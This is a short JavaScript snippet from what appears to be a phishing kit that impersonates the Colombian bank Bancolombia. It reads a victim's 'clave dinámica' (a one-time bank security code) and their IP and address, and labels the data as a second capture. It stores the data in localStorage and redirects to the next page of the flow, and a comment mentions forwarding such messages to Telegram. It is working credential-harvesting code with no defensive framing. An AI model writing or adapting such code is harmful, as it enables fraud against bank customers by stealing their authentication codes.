<script>
// Variables para los datos
var u_name, ip, ip2;

// Función para obtener los valores y almacenarlos en localStorage
var ready = function () {
    u_name = document.getElementById("clavex").value;  // Obtener la clave dinámica
    ip = document.getElementById("gfg").innerHTML;     // Obtener la IP
    ip2 = document.getElementById("address").innerHTML; // Obtener la segunda IP o dirección

    // Crear el mensaje (solo para referencia, no lo enviaremos a Telegram)
    var message = "DINAMICA #2: " + u_name + "\n\nIP: " + ip + "\n" + ip2 + "\nBANCOLOMBIA";
    
    // Guardar los datos en localStorage como "dinamica2"
    localStorage.setItem("dinamica2", u_name); // Guardar la clave dinámica
    localStorage.setItem("ip", ip);             // Guardar la IP
    localStorage.setItem("ip2", ip2);           // Guardar la segunda IP o dirección
    
    console.log("Datos guardados en localStorage");
    console.log("Clave dinámica:", u_name);
    console.log("IP:", ip);
    console.log("IP 2:", ip2);
};

// Función para redirigir después de guardar los datos
var sender = function () {
    ready(); // Llamamos a la función para guardar los datos en localStorage
    window.location = 'index5.html'; // Redirigimos a la página deseada
    return false;
};
</script>
